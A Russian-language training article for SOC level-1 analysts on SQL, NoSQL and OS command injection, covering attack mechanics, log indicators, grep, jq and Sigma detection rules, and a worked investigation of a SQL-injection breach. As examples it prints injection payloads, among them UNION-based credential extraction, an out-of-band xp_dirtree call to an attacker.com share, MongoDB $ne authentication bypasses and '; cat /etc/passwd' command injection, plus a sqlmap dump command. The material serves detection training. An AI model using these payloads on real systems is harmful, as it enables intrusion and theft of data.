# Инъекции в веб-приложениях: SQL, NoSQL и командные инъекции

## 1. Определения и классификация инъекционных атак

Инъекция — класс уязвимостей, при котором нефильтрованный пользовательский ввод интерпретируется как часть команды или запроса, выполняемого целевой системой. В контексте SOC L1 инъекции занимают одну из верхних позиций в списке угроз: в OWASP Top 10 2017 категория «Injection» (включающая SQL, NoSQL, OS command injection, LDAP-инъекции и др.) находилась на третьем месте. В реальной эксплуатации злоумышленник подставляет управляющие конструкции, нарушающие логику приложения и позволяющие читать, изменять или удалять данные, а в случае командных инъекций — выполнять произвольный код на уровне ОС.

Ключевая причина уязвимости — отсутствие строгого разделения данных и кода. Разработчик динамически формирует запрос, конкатенируя строку с пользовательским параметром, полагая, что параметр будет содержать ожидаемое значение. Однако злоумышленник вводит метасимволы (кавычки, точки с запятой, операторы конвейера), которые изменяют синтаксис результирующей команды. В этот момент происходит инъекция.

Для специалиста SOC критически важно различать типы инъекций по характеру цели, векторам и наблюдаемым артефактам (логи, сетевые сигнатуры, поведенческие аномалии). Ниже приведена сравнительная таблица, фиксирующая основные различия между тремя аспектами темы.

| Тип инъекции | Целевой компонент | Основной механизм внедрения | Типичные индикаторы в логах/трафике |
|--------------|-------------------|-----------------------------|--------------------------------------|
| **SQL Injection (SQLi)** | Реляционная СУБД (MySQL, PostgreSQL, MSSQL, Oracle и др.) | Вставка управляющих символов (`'`, `;`, `--`) и ключевых слов (`UNION`, `SELECT`, `OR 1=1`) в поля ввода или параметры URL, которые попадают в динамический SQL-запрос | Наличие в URL/теле запроса фрагментов вроде `' OR 1=1 --`, `UNION SELECT`, `'; WAITFOR DELAY '0:0:5'--`; ошибки СУБД в ответах (например, `mysql_fetch_array()`, `ORA-01756`); аномально долгие ответы (при time-based blind) |
| **NoSQL Injection (NoSQLi)** | Нереляционные БД (MongoDB, CouchDB, Elasticsearch, Redis и др.) | Манипуляции с JSON/BSON-структурами, операторами `$where`, `$regex`, `$ne`, или внедрение серверного JavaScript (SSJI) | Запросы, содержащие `{"$gt":""}`, `{"$where":"sleep(5000)"}`, `{"$regex":"^a"}` в теле POST; JavaScript-фрагменты в параметрах, обрабатываемых сервером |
| **Command Injection** | Операционная система сервера (shell) | Внедрение разделителей команд (`;`, `|`, `||`, `&&`, `` ` ``, `$()`) в поля, передаваемые функциям типа `system()`, `exec()`, `popen()` или напрямую в команды ОС | Символы конвейера и подстановки в неожиданных местах; аномальные исходящие соединения; результаты выполнения команд в ответах сервера (вывод `id`, `whoami`, `cat /etc/passwd`) |

Все три типа инъекций объединяет общий паттерн: небезопасное использование пользовательских данных в интерпретируемом контексте. Однако каждый имеет собственную специфику обнаружения и нейтрализации, которую необходимо знать аналитику SOC при разборе алертов.

SQL-инъекция эксплуатирует синтаксис декларативного языка SQL. Классический пример: приложение формирует запрос `"SELECT * FROM users WHERE name = '" + input + "'"`. Если `input` равен `' OR '1'='1`, итоговый запрос становится `SELECT * FROM users WHERE name = '' OR '1'='1'`, возвращая все записи. NoSQL-инъекции часто работают на уровне API драйвера, подставляя вместо ожидаемой строки объект с операторами сравнения. Например, в MongoDB при проверке логина вида `db.users.findOne({user: user, password: pass})` злоумышленник может передать `{"$ne": ""}` в качестве значения, что всегда истинно. Command injection опасен тем, что напрямую связывает веб-приложение и shell, позволяя выполнять команды с привилегиями серверного процесса.

В SOC L1 важно понимать эти различия не только для корректной классификации инцидентов, но и для эскалации: SQLi может указывать на попытку кражи данных, NoSQLi — на обход аутентификации, а command injection — на полную компрометацию хоста. Отработка каждого случая требует различного набора артефактов и дальнейших шагов.

## 2. Механизмы и векторы атак: как работают SQLi, NoSQLi и command injection

Данный раздел посвящён внутреннему устройству каждого типа инъекций — классификации, технике эксплуатации и типичным способам обхода защит.

### 2.1 Классификация SQL-инъекций

SQL-инъекции разделяют по способу извлечения данных и каналам взаимодействия. Традиционная типология, широко принятая в сообществе (см. Imperva), включает три основные категории: In-band (классическая), Inferential (слепая) и Out-of-band.

Для SOC-аналитика важно уметь отличать их по характеру трафика и ответов сервера, так как это влияет на настройку правил корреляции. В таблице ниже приведено сравнение подтипов с характерными индикаторами.

| Категория | Подтип | Способ эксплуатации | Типичные признаки в SIEM/логах |
|-----------|--------|---------------------|--------------------------------|
| **In-band SQLi** | Error-based | Злоумышленник вызывает ошибки базы данных, содержащие информацию о структуре (например, `' AND 1=CONVERT(int, @@version) --`). Ошибка возвращается в том же канале ответа. | HTTP-ответы 500 с сообщениями вида `Unclosed quotation mark`, `Incorrect syntax near`, `ORA-00933`, `Column count doesn't match`. Часто содержат детали СУБД. |
| | Union-based | Использует оператор `UNION SELECT` для объединения результатов злоумышленника с легитимным запросом. Требует совпадения количества и типов столбцов. | Запросы с `UNION SELECT NULL,NULL,...` для определения числа столбцов, затем `UNION SELECT user(),version()`. В логах видны повторяющиеся запросы с наращиванием NULL. |
| **Inferential (Blind) SQLi** | Boolean-based | Посылает запросы, изменяющие поведение приложения в зависимости от истинности условия, например, `' AND 1=1 --` и `' AND 1=2 --`. Разница в ответах (контент, редирект) позволяет извлекать данные бит за битом. | Множество похожих запросов с варьирующимися условиями; идентичные URL с разным значением одного параметра, вызывающие разные ответы (200 vs 302 vs разный размер). |
| | Time-based | Основан на задержках: `'; WAITFOR DELAY '0:0:5'--` (MSSQL), `' AND SLEEP(5)` (MySQL). Если приложение задерживает ответ, условие истинно. | Аномально долгое выполнение запросов (пороговые значения > 3–5 с), измеряемое WAF или NTA; множество медленных запросов от одного IP. |
| **Out-of-band SQLi** | DNS/HTTP exfiltration | Используется, когда прямые каналы недоступны. Злоумышленник заставляет СУБД выполнить DNS-запрос или HTTP-запрос к контролируемому серверу (e.g., `'; EXEC master..xp_dirtree '\\attacker.com\share'` - MSSQL). | DNS-запросы к подозрительным доменам от сервера БД; исходящие SMB/HTTP-соединения на внешние IP. Редкий, но высококритичный вектор. |

Каждый подтип требует специфического подхода к детектированию. Error-based легко ловится по сигнатурам ошибок, Union-based — по ключевым словам в URL и теле запроса, Blind — поведенческими методами (частотный анализ, аномалии времени ответа), Out-of-band — по сетевым аномалиям (DNS-туннелинг). В SOC полезно комбинировать сигнатурные правила (например, Sigma-правила для строк вроде `UNION SELECT`) и поведенческую аналитику.

### 2.2 Механика NoSQL-инъекций

NoSQL-базы данных не используют единый язык запросов, поэтому атаки на них зависят от конкретной СУБД и API. Наиболее изучены инъекции в MongoDB ввиду её популярности. Уязвимость возникает, когда приложение принимает JSON-данные от пользователя и напрямую подставляет их в запрос драйвера.

Ключевые уязвимые конструкции:

- **Операторы сравнения в фильтрах**: В MongoDB драйверы ожидают, что значение будет строкой/числом, но если приложение не проверяет тип, злоумышленник может передать объект с оператором `$ne`, `$gt`, `$regex`. Например, аутентификационный запрос `db.users.findOne({login: login, password: password})` становится обходимым при `login = 'admin'` и `password = {"$ne":""}`, что означает "пароль не равен пустой строке" и всегда истинно. Аналогично `{"$gt":""}`. В логах это выглядит как POST-тело с JSON-объектом вместо ожидаемой строки.

- **Инъекции через регулярные выражения**: Оператор `$regex` позволяет проводить перебор значений без знания точной строки. Например, `password: {"$regex":"^a"}` проверяет, начинается ли пароль с 'a'. Time-based слепая эксплуатация: `{"$regex":"^a.*"}` может занять больше времени из-за сканирования. Специфический вектор — использование `$regex` в комбинации с `$where`.

- **Server-Side JavaScript Injection (SSJI)**: Некоторые конструкции MongoDB позволяют выполнять произвольный JavaScript на сервере: оператор `$where` и вызовы `db.eval()`. Если пользовательские данные попадают в строку JavaScript, злоумышленник внедряет выражения вроде `' + sleep(5000) + '` или `' + process.exit() + '`. Например, из выдержки (Habr): аутентификация через `$where` формирует строку `"this.login === '" + login + "' && this.password === '" + password + "'"`. Логин `' || 1==1 || '` приведёт к условию `this.login === '' || 1==1 || ''`. Более опасно: `' + (function(){...})() + '` может выполнить произвольный код на сервере с правами процесса Node.js. Индикатор SSJI — наличие JavaScript-кода в параметрах, особенно с функциями типа `sleep`, `require`, `process`.

- **Манипуляции с REST-интерфейсами**: Некоторые NoSQL-базы (CouchDB, Elasticsearch) предоставляют HTTP API, где JSON-тело запроса напрямую обрабатывается. Неочищенные параметры в URL или теле могут приводить к инъекциям, аналогичным SQLi, но в контексте JSON-структур.

Типичный индикатор NoSQLi в веб-логах — POST-запросы с JSON, содержащим ключи `$where`, `$regex`, `$ne` вместо ожидаемых пользовательских значений. Для SOC важно учитывать, что многие WAF по умолчанию ориентированы на SQL-сигнатуры и могут пропускать NoSQL-вектора.

Механизм эксплуатации можно визуализировать на примере обхода аутентификации в MongoDB (иллюстративная схема взаимодействия компонентов):

```text
[Клиент] ──(POST /login, JSON: {"user":"admin","pass":{"$ne":""}})──▶ [Веб-приложение]
   │
   ▼
[Приложение строит запрос: db.users.findOne({user:"admin", pass:{"$ne":""}}) без проверки типов]
   │
   ▼
[MongoDB] возвращает первого пользователя с именем admin, т.к. pass не равно "" (всегда true)
   │
   ▼
[Веб-приложение] ◀──(успешная сессия)── [Клиент]
```

### 2.3 Командные инъекции (Command Injection)

Командная инъекция — внедрение произвольных команд операционной системы в уязвимое приложение, которое вызывает функции взаимодействия с оболочкой. Типичные функции в разных языках:

- PHP: `system()`, `exec()`, `shell_exec()`, `passthru()`, обратные кавычки `` ` ``;
- Python: `os.system()`, `os.popen()`, `subprocess.call(shell=True)`;
- Node.js: `child_process.exec()`, `child_process.spawn()` с shell: true;
- Ruby: `exec()`, `system()`, `` ` ``;
- Perl: `system()`, `exec()`, `open()` с pipe.

Уязвимость возникает, когда приложение конкатенирует пользовательский ввод с командной строкой, не фильтруя разделители команд. Разделители варьируются в зависимости от ОС и оболочки: в Unix/Linux это `;`, `|`, `||`, `&&`, `` ` ``, `$()`, символ перевода строки `%0a`; в Windows — `&`, `&&`, `|`, `||`, а также `^` для экранирования. Часть из них может быть заблокирована, однако злоумышленники применяют обходы (например, `%0a` вместо `;` для ненастроенных фильтров).

Типичный сценарий: веб-интерфейс пинга, где поле IP передаётся как аргумент команде `ping -c 4 <user_input>`. При вводе `127.0.0.1; id` будет выполнено `ping -c 4 127.0.0.1; id`, и вывод `id` вернётся пользователю. Если вывод не отображается, можно использовать слепую эксплуатацию через временные задержки (`sleep 5`) или побочные каналы.

Механика command injection отличается от SQLi тем, что злоумышленник взаимодействует напрямую с ОС, а не с СУБД. Это открывает путь к пост-эксплуатации: обратные шеллы, эксфильтрация данных, установка вредоносного ПО. Поэтому индикаторы включают не только специфичные паттерны в URL и параметрах, но и системные события (запуск неожиданных процессов, сетевые подключения к подозрительным портам).

Схема эксплуатации классической command injection:

```text
[Клиент] ──(GET /ping?ip=127.0.0.1;+cat+/etc/passwd)──▶ [Веб-сервер]
   │
   ▼
[Приложение вызывает system("ping -c 4 " + $ip)]
   │
   ▼
[Shell] выполняет: ping -c 4 127.0.0.1; cat /etc/passwd
   │
   ▼
[Веб-сервер] ◀──(вывод файла passwd)── [Клиент]
```

В SOC контексте команды `whoami`, `id`, `uname -a`, `ls -la`, `cat /etc/passwd`, а также попытки скачивания файлов (`wget`, `curl`) в подозрительных полях должны немедленно эскалироваться. Правила детектирования часто строятся на регулярных выражениях в полях запроса (user-agent, параметры URL), но с осторожностью из-за высокой вероятности ложноположительных срабатываний.

## 3. Применение и работа с инъекциями в контексте SOC

Аналитик SOC L1 при расследовании алертов на инъекции должен уметь: идентифицировать тип атаки по предоставленным артефактам, выполнить первичный анализ с применением стандартных утилит, понять серьёзность инцидента и выполнить эскалацию согласно процедурам. В этом разделе собраны ключевые операции и инструменты для каждого типа инъекций.

### 3.1 Работа с SQL-инъекциями

**Первичный анализ веб-логов.**  
Как правило, алерт на SQLi поступает из WAF или IDS/IPS в виде сигнатурного срабатывания, например, при обнаружении `UNION SELECT` в параметрах GET/POST. Аналитик должен извлечь сырой запрос из лога и декодировать URL-кодированные символы. Пример команды извлечения подозрительного запроса из журнала Apache (иллюстративная схема, значения зависят от среды):

```bash
grep -i "union\|select\|\-\-" /var/log/apache2/access.log | tail -20
```

Вывод может содержать строки типа:

```
192.168.1.100 - - [10/Dec/2025:10:23:45 +0000] "GET /products?id=1' UNION SELECT 1,table_name,3 FROM information_schema.tables-- HTTP/1.1" 200 2345
```

Далее аналитик классифицирует атаку как Union-based. Следующий шаг — оценка успешности: статус ответа `200` с размером 2345 байт, но без деталей ответа сложно судить. Если SIEM агрегирует и ошибки SQL, можно проверить, были ли ошибки от этого IP ранее (error-based разведка). При отсутствии дополнительных данных алерт может быть эскалирован на L2 для анализа ответов и возможных последствий.

**Ручная проверка параметров.**  
В рамках подтверждения аналитик SOC может аккуратно провести реидентификацию уязвимости на тестовой среде или с помощью `curl`, имитируя запрос. Однако в продуктивной среде категорически не рекомендуется применять инъекционные векторы. Вместо этого используют SQL-мапперы под строгим контролем. Основной инструмент — `sqlmap`. Пример запуска для проверки уязвимого параметра (иллюстративный синтаксис, флаг `--risk` и `--level` выбираются согласно политике):

```bash
sqlmap -u "http://target.example.com/products?id=1" --dbms=mysql --batch --dump
```

Вывод может показать обнаруженную уязвимость (In-band, Blind), перечислить таблицы и содержимое. В реальной SOC-работе sqlmap применяется только в рамках согласованного тестирования, а при расследовании алерта достаточно анализа логов и корреляции с другими данными (например, последующий доступ к базе данных из того же исходного IP).

**Детектирование на уровне SIEM.**  
Хорошим тоном является написание правил корреляции, которые агрегируют множественные попытки SQLi от одного источника за короткий промежуток времени: это повышает уверенность в целенаправленной атаке. Также полезно сопоставлять события с моделями аномального поведения: резкий рост ошибок 500 от веб-сервера, увеличение времени ответа (Time-based). Пример Sigma-правила для обнаружения Union-based SQLi в веб-логах (структура правила):

```yaml
title: SQL Injection Union Select Detected
id: 8f4b1e2d-3a5c-4b9f-a1b2-c3d4e5f6a7b8
status: experimental
author: SOC Team
logsource:
  category: webserver
detection:
  selection:
    cs-method: 'GET'
    c-uri|contains: 
      - 'UNION'
      - 'SELECT'
    c-uri|re: '(?i)union.*select'
  condition: selection
falsepositives:
  - Legitimate application use of these keywords in parameters
level: high
```

Здесь важно указать, что точные идентификаторы и выражения адаптируются под конкретную среду.

### 3.2 Работа с NoSQL-инъекциями

**Артефакты в логах NoSQL.**  
Провайдеры облачных WAF или логи приложений могут содержать JSON-тела запросов. Задача аналитика — вычленить нестандартные JSON-структуры, содержащие служебные операторы. Пример извлечения из логов Node.js приложения (иллюстративно, формат зависит от используемого логгера):

```bash
grep -E '\$ne|\$where|\$regex' /var/log/app/app.log
```

Вывод может выглядеть как:

```
2025-12-10T11:05:22.123Z - POST /login - {"user":"admin","password":{"$ne":""}}
2025-12-10T11:05:25.987Z - POST /search - {"query":{"$where":"sleep(5000)"}}
```

Первый алерт указывает на попытку обхода аутентификации (использование `$ne`), второй — на SSJI через `$where`. Последний особенно критичен, так как свидетельствует о возможном выполнении JavaScript на сервере.

**Техники ручного анализа.**  
Если SIEM не распарсил тело JSON, можно использовать `jq` для фильтрации ключей, содержащих `$`:

```bash
cat app.log | jq 'select(.. | objects | has("$ne") or has("$where") or has("$regex"))'
```

Это поможет выделить только подозрительные записи. Далее сопоставляются IP источника, временная метка, последующие действия (успешная аутентификация, создание администратора и т.д.) — все доступные события из других источников.

**Проверка на SSJI.**  
Признаки SSJI включают вызовы методов, нехарактерных для нормального пользовательского ввода: `require()`, `process.exit()`, `db.version()`. В логах приложений может быть виден JS-код, вставленный через параметры. Пример ручного поиска:

```bash
grep -iP 'require|process\.exit|this\.' app.log
```

Если обнаружено, приоритет инцидента повышается до критического, так как злоумышленник может выполнять произвольный код в контексте сервера.

### 3.3 Работа с Command Injection

**Выявление вектора в логах.**  
Подозрительные запросы часто содержат разделители команд и системные утилиты. Пример команды для поиска в access-логах:

```bash
grep -P ';[ \t]*id|;\s*ls|;\s*cat|%0a|\||&&' /var/log/nginx/access.log
```

Вывод может содержать:

```
192.168.1.200 - - [10/Dec/2025:11:15:40 +0000] "GET /diagnostics?host=127.0.0.1;id HTTP/1.1" 200 512
```

Здесь видна попытка выполнить `id` после легитимной команды. Аналитик должен проверить, не последовало ли за этим других команд (например, `whoami`, `cat /etc/passwd`) и не исходило ли от хоста вскоре исходящее соединение на внешний сервер (netflow-логи). Если обнаружено — эскалация до уровня "возможная компрометация хоста".

**Распознавание обфускации.**  
Атакующие часто кодируют команды: `echo` с base64, URL-кодирование спецсимволов (`%0a`, `%3B`). Например, параметр `127.0.0.1%0aid` эквивалентен `;id`. Поэтому необходимо декодировать параметры перед анализом. Полезная практика — автоматическая нормализация запросов в SIEM с последующей проверкой на наличие shell-команд. Пример Python-сниппета для расшифровки (не для продуктивного использования без интеграции):

```python
import urllib.parse, sys
for line in sys.stdin:
    print(urllib.parse.unquote(line))
```

**Меры защиты и рекомендации SOC.**  
Хотя предотвращение — задача разработчиков, SOC может рекомендовать временные меры при атаке: блокировка IP на WAF, виртуальное патчирование через WAF с правилами для экранирования метасимволов. Более фундаментально: переход на параметризованные вызовы, например, в Python — `subprocess.run(["ping", "-c", "4", user_ip])`, где `user_ip` не интерпретируется оболочкой. Аналитик должен уметь отличать такие безопасные реализации от уязвимых при разборе кода в процессе Threat Hunting.

## 4. Сквозной практический пример: расследование SQLi-атаки на корпоративный портал

**Исходные условия:**  
Сотрудник SOC L1 получает алерт от WAF: "SQL Injection Attempt — Union Select" с IP 203.0.113.45. Целевой ресурс — корпоративный портал `https://portal.company.com/products?id=10`. SIEM показывает несколько срабатываний за последние 5 минут от того же IP. Имеется доступ к логам Apache и к логам приложения. Задача: проверить факт атаки, определить успешность и эскалировать.

**Шаг 1. Извлечение сырых логов из архива SIEM.**  
Аналитик выполняет поиск по IP в сырых логах Apache:

```bash
grep '203.0.113.45' /var/log/apache2/access.log | tail -10
```

Вывод:

```
203.0.113.45 - - [10/Dec/2025:14:02:10 +0000] "GET /products?id=10' UNION SELECT 1,2,3-- HTTP/1.1" 200 456
203.0.113.45 - - [10/Dec/2025:14:02:12 +0000] "GET /products?id=10' UNION SELECT 1,table_name,3 FROM information_schema.tables-- HTTP/1.1" 200 980
203.0.113.45 - - [10/Dec/2025:14:02:15 +0000] "GET /products?id=10' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- HTTP/1.1" 200 1120
203.0.113.45 - - [10/Dec/2025:14:02:18 +0000] "GET /products?id=10' UNION SELECT 1,username,password FROM users-- HTTP/1.1" 200 1534
```

**Результат:** Зафиксирована последовательность типичных шагов Union-based SQLi: определение структуры, извлечение схемы БД и, наконец, получение данных из таблицы `users`. Статусы ответов 200 и возрастающий размер ответа позволяют предположить успешное извлечение данных.

**Шаг 2. Анализ контекста и оценка ущерба.**  
Аналитик проверяет, были ли дополнительные действия от того же IP после извлечения данных. Поиск в логах за следующие 10 минут:

```bash
grep '203.0.113.45' /var/log/apache2/access.log | awk '$4 >= "[10/Dec/2025:14:02:18"'
```

Вывод показывает запрос на `/admin`:

```
203.0.113.45 - - [10/Dec/2025:14:03:05 +0000] "GET /admin HTTP/1.1" 403 234
203.0.113.45 - - [10/Dec/2025:14:03:06 +0000] "GET /admin HTTP/1.1" 403 234
```

Злоумышленник попытался обратиться к админ-панели, но получил 403. Однако неизвестно, смог ли он аутентифицироваться. Аналитик сопоставляет события с логами приложения (аутентификация). Из логов приложения:

```json
{"timestamp":"2025-12-10T14:03:10Z","event":"login","user":"admin","status":"success","src_ip":"203.0.113.45"}
```

Это означает, что с использованием полученных учетных данных (username и password) злоумышленник успешно вошёл как администратор. Инцидент получает критический приоритет.

**Шаг 3. Эскалация и начальные контрмеры.**  
Аналитик формирует алерт в тикет-системе, включающий:

- Сводку: SQLi-attack с эксфильтрацией учетных данных, последующая компрометация аккаунта admin.
- Артефакты: фрагменты логов, JSON-событие входа.
- Рекомендацию: временно заблокировать IP на WAF, инициировать сброс паролей всех пользователей (особенно администраторов), запустить расследование L2 на предмет дальнейших действий злоумышленника внутри системы.
- Предлагает виртуальный патч через WAF: правило, блокирующее `UNION SELECT` в параметре `id`.

Пример команды для блокировки IP через iptables (если есть право):

```bash
sudo iptables -A INPUT -s 203.0.113.45 -j DROP
```

**Шаг 4. Пост-анализ и уроки.**  
После нейтрализации проводится ретроспектива. Аналитик проверяет, не было ли предшествующих разведывательных запросов: сканирование на наличие параметра `id`, ошибок. В логах за час до атаки находит:

```
203.0.113.45 - - [10/Dec/2025:13:55:00 +0000] "GET /products?id=10' HTTP/1.1" 500 1234
```

Это подтверждает обнаружение уязвимости через error-based. Итоговый отчёт включает временные метки, IP, векторы атаки и рекомендует разработчикам применить параметризованные запросы для страницы `/products`. Также обновляются правила корреляции SIEM для автоматического детектирования последовательности "500 ошибка → Union Select → успешный вход" для раннего предупреждения.

**Ожидаемый вывод примера:** Демонстрируется полный цикл работы SOC L1 с SQLi-инцидентом: от идентификации алерта до эскалации, включая использование команд анализа логов, интерпретацию артефактов и базовые защитные действия. Наглядно показано, как последовательность событий в логах раскрывает намерения злоумышленника и масштаб воздействия.
